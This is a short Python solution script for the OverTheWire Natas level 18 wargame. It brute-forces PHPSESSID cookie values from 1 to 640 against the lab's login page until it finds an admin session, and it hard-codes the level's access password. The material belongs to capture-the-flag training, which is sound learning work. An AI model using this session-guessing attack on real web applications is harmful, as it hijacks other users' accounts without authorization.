import requests

url = 'http://natas18.natas.labs.overthewire.org/index.php?debug'
natas18_username = 'natas18'
natas18_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

data = {'username': 'a', 'password': 'a'}
for i in range(1, 641):
    cookies = {'PHPSESSID': str(i)}
    r = requests.post(url, data=data, cookies=cookies,
                      auth=(natas18_username, natas18_password))
    if 'regular user' in r.text:
        print(i)
    else:
        print(r.text)
        break
